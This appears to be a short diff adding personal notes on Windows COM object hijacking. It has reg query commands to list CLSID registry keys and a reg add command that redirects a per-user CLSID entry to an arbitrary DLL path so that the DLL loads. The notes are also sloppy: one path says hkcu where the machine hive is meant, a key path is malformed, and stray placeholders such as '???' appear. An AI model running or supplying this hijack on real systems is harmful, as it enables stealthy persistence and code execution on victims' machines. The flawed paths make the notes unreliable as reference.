@@ -1,0 +1,14 @@
+//query local machine reg hive 
+reg query hklm\software\classes\clsid
+
+//list all com obj in current user reg hive
+reg query HKCU\Software\Classes\Wow6432Node\CLSID ???
+
+//query file behind com obj hijack
+//user
+hkcu\software\classes\clsid\{ID NUN}\{PROC ID}InprocServer32
+//computer
+hkcu\software\classes\clsid\{ID NUN}\{PROC ID}
+
+//com hijack to load dll/exe
+reg add hkcu\software\classes\clsid\{ID NUN}\{PROC ID} /ve /t REG_SZ /d {FILE PATH TO DLL}
